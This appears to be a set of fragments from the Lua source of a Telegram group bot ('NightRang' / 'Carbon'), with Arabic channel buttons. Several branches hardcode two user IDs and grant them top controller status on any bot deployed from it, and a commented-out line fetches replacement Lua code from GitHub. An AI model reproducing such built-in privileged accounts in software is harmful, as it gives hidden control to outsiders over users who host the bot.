...
if UserId == 1050633704 then
Status = true
elseif UserId == 1188421937 then
Status = true
...
if UserId == 1188421937 then
Status = 'Carbon'
elseif UserId == 1050633704 then
Status = 'Carbon'
elseif UserId == Sudo_Id then  
Status = 'Carbon'
elseif UserId == FDFGERB then
...
if tonumber(msg.sender.user_id) == 1050633704 then
msg.Name_Controller = 'Carbon '
msg.The_Controller = 1
elseif tonumber(msg.sender.user_id) == 1188421937 then
msg.Name_Controller = 'Carbon'
msg.The_Controller = 1
...
{
{text = 'NightRang', url='https://t.me/pqppp'},
},
}
}
...
--download('https://raw.githubusercontent.com/SourceFDFGERB/FDFGERB/master/FDFGERB.lua','FDFGERB.lua')
...
data = {
{
{text = '❲ Source NightRang ❳', url = "https://t.me/pqppp"}
},
{
{text = '❲ SourceManger ❳', url = "https://t.me/V5VVV"}
},
{
...
return LuaTele.sendText(msg_chat_id,msg_id,"[NightRang Source](t.me/pQppp)\n\n[Source Manger](t.me/v5vvv)","md",true, false, false, false,reply_markup)
end
...
data = {
{
{text = '- قناة السورس', url = 't.me/pqppp'}, 
},
}
}
